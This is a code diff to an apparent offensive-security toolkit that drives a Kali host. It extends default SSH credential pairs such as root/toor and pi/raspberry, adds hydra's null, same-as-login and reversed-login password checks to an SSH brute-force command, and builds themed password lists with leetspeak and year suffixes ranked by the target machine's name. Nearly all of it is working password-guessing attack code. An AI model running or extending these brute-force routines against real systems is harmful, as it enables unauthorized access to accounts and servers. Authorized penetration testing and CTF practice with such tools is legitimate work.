@@ -33,7 +33,11 @@ def _is_gpu_only(hash_type: str, hash_value: str) -> bool:
 
 
 SERVICE_DEFAULTS: dict[str, list[tuple[str, str]]] = {
-    "ssh": [("root", "root"), ("root", "toor"), ("admin", "admin"), ("kali", "kali")],
+    "ssh": [
+        ("root", "root"), ("root", "toor"), ("admin", "admin"), ("kali", "kali"),
+        ("ubuntu", "ubuntu"), ("user", "user"), ("pi", "raspberry"),
+        ("guest", "guest"), ("test", "test"), ("deploy", "deploy"),
+    ],
     "mysql": [("root", ""), ("root", "root"), ("mysql", "mysql"), ("admin", "admin")],
     "ftp": [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")],
     "rdp": [("administrator", "administrator"), ("admin", "admin")],
@@ -162,7 +166,7 @@ async def creds_ssh_bruteforce(
         f"set -e; uf=$(mktemp); printf {shlex.quote(users_payload)} > $uf; "
         f"timeout {max(30, timeout - 10)}s "
         f"hydra -L $uf -P {shlex.quote(wordlist)} ssh://{shlex.quote(target)} "
-        f"-t {threads} -q 2>&1; rm -f $uf"
+        f"-t {threads} -q -e nsr 2>&1; rm -f $uf"
     )
     res = await _run_kali(cmd, timeout=float(timeout + 30))
 
@@ -199,6 +203,13 @@ async def creds_ssh_bruteforce(
         "hits": hits,
         "rc": res["rc"],
         "duration_s": res["duration_s"],
+        "stdout_tail": res["stdout"][-2000:] if res.get("stdout") else "",
+        "timed_out": "KESTREL_TIMEOUT=1" in (res.get("stdout") or ""),
+        "error_hint": next(
+            (m for m in ("Connection refused", "[ERROR]", "timeout", "0 valid", "ssh: Target")
+             if m.lower() in (res.get("stdout") or "").lower()),
+            None
+        ),
     }
 
 
@@ -238,6 +249,16 @@ async def creds_themed_wordlist_gen(
             f"{w_lower}2024!", f"{w_lower}2025!",
         ])
 
+    LEET = str.maketrans("aeiost", "431057")
+    EXTRA_SUFFIXES = ["!", "01", "007", "99", "2022", "2023", "2022!", "2023!", "2024!"]
+
+    for w in base_words:
+        w_lower = w.lower().replace(" ", "").replace("-", "").replace("_", "")
+        w_leet = w_lower.translate(LEET)
+        for base_variant in [w_lower, w_lower.capitalize(), w_lower.upper(), w_leet, w_leet.capitalize()]:
+            for suf in EXTRA_SUFFIXES:
+                words.add(base_variant + suf)
+
     words.update([
         "password", "Password", "Password123", "password123",
         "admin", "Admin", "admin123", "Admin123",
@@ -247,7 +268,15 @@ async def creds_themed_wordlist_gen(
         "qwerty", "iloveyou", "dragon", "master",
     ])
 
-    wordlist_content = "\n".join(sorted(words))
+    def _priority_key(word: str, machine_lower: str) -> int:
+        wl = word.lower()
+        if wl == machine_lower: return 0
+        if wl.startswith(machine_lower): return 1
+        if machine_lower in wl: return 2
+        return 10
+
+    machine_lower = machine.lower()
+    wordlist_content = "\n".join(sorted(words, key=lambda w: (_priority_key(w, machine_lower), w)))
     out_path = output_path or f"/tmp/kestrel-themed-{machine}.txt"
     cmd = (
         f"printf {shlex.quote(wordlist_content)} > {shlex.quote(out_path)} "
